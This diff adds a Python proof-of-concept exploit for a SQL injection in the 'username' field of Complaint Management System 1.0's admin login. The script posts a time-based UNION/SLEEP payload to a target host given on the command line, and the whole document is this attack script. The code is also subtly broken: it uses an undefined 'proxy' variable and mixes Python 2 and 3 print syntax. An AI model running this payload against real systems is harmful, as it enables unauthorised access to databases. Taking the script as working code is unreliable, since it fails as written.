@@ -1,0 +1,41 @@
+# Exploit Title: Complaint Management System 1.0 - 'username' SQL Injection
+# Exploit Author: Daniel Ortiz
+# Date: 2020-05-12
+# Vendor Homepage: https://www.sourcecodester.com/php/14206/complaint-management-system.html
+# Tested on: XAMPP Version 5.6.40 / Windows 10
+# Software Link:  https://www.sourcecodester.com/php/14206/complaint-management-system.html
+
+#!/usr/bin/python
+
+import sys
+import requests
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecurePlatformWarning)
+
+def main():
+    
+    target = sys.argv[1]
+    payload = "ADMIN' UNION SELECT NULL,NULL,NULL,SLEEP(5)#"
+    url = "http://%s/cms/admin/index.php" % target
+    
+    print("[+] Target: %s") % target
+    print("[+] Injecting payload: %s") % payload
+
+    inject(url, payload)
+
+def inject(url, payload):
+
+    s = requests.Session()
+    d = {'username': payload, 'password': 'admin', 'submit': ''} 
+    r = s.post(url, data=d, proxies=proxy)
+
+
+if __name__ == '__main__':
+
+    if len(sys.argv) != 2:
+        print("(-) usage: %s  TARGET" % sys.argv[0])
+        print("(-) e.g: %s  192.168.0.10" % sys.argv[0]) 
+        sys.exit(-1)
+
+    main()
